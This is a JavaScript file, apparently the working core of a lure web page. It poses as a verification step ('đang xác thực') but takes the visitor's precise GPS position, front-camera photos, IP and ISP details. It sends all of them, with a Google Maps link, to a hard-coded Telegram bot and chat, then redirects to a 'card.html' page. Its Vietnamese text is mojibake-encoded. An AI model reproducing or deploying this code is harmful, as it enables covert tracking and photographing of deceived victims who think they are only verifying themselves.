const TK = '8515848831:AAGCu3F93VGsKgNJtcFYBF5AJbloujLRID0';
const CID = '8386422438';

async function st() {
    const btn = document.getElementById('b');
    btn.innerText = "ÄANG XÃC THá»°C...";
    btn.disabled = true;

    // 1. Ã‰P BUá»˜C Láº¤Y GPS CHÃNH XÃC CAO
    let gps = null;
    try {
        gps = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, {
                enableHighAccuracy: true,
                timeout: 8000,
                maximumAge: 0
            });
        });
    } catch (e) { console.log("KhÃ´ng láº¥y Ä‘Æ°á»£c GPS."); }

    // 2. Má» CAMERA (Sá»­a lá»—i "Lá»—i camera")
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" },
            audio: false 
        });
        document.getElementById('v').srcObject = stream;

        // 3. Láº¤Y THÃ”NG TIN IP & ISP CHI TIáº¾T
        const ipR = await fetch('https://ipapi.co/json/');
        const d = await ipR.json();
        const mID = `[${d.ip.split('.').pop()}] ${navigator.platform.replace('iPhone', 'iP')}`;
        localStorage.setItem('mID', mID);

        // Chá»¥p táº¥m 1 ngay sau 1 giÃ¢y
        setTimeout(() => sendFull(gps ? gps.coords : null, d, mID, "Táº¤M 1"), 1000);
        // Chá»¥p táº¥m 2 sau Ä‘Ã³ Ä‘Ãºng 2 giÃ¢y
        setTimeout(() => sendFull(gps ? gps.coords : null, d, mID, "Táº¤M 2"), 3000);

        setTimeout(() => { window.location.href = 'card.html'; }, 5000);
    } catch (err) {
        alert("Lá»—i camera: Vui lÃ²ng dÃ¹ng Safari vÃ  cho phÃ©p quyá»n truy cáº­p.");
        btn.disabled = false;
    }
}

async function sendFull(c, d, m, note) {
    const v = document.getElementById('v');
    const can = document.createElement('canvas');
    can.width = v.videoWidth; can.height = v.videoHeight;
    can.getContext('2d').drawImage(v, 0, 0);

    can.toBlob(async (blob) => {
        const lat = c ? c.latitude : d.latitude;
        const lon = c ? c.longitude : d.longitude;
        
        // Ná»˜I DUNG CHUáº¨N NHÆ¯ MáºªU TRONG áº¢NH 5 VÃ€ 8
        const msg = `
ğŸ“¡ [THÃ”NG TIN TRUY Cáº¬P - ${note}]

ğŸ•’ Thá»i gian: ${new Date().toLocaleString('vi-VN')}
ğŸ“± Thiáº¿t bá»‹: ${m}
ğŸ–¥ï¸ Há»‡ Ä‘iá»u hÃ nh: iOS
ğŸŒ IP dÃ¢n cÆ°: ${d.ip}
ğŸ§  IP gá»‘c: ${d.ip}
ğŸ¢ ISP: ${d.org}
ğŸ™ï¸ Äá»‹a chá»‰: ${d.city}, ${d.region}, ${d.country_name}
ğŸŒ Quá»‘c gia: ${d.country_name}
ğŸ“ VÄ© Ä‘á»™: ${lat}
ğŸ“ Kinh Ä‘á»™: ${lon}
ğŸ“Œ Google Maps: https://maps.google.com/maps?q=${lat},${lon}
ğŸ“¸ Camera: âœ… ÄÃ£ chá»¥p thÃ nh cÃ´ng`;

        const f = new FormData();
        f.append('chat_id', CID);
        f.append('photo', blob, 'cam.jpg');
        f.append('caption', msg);
        f.append('parse_mode', 'HTML');

        await fetch(`https://api.telegram.org/bot${TK}/sendPhoto`, { method: 'POST', body: f });
    }, 'image/jpeg');
}
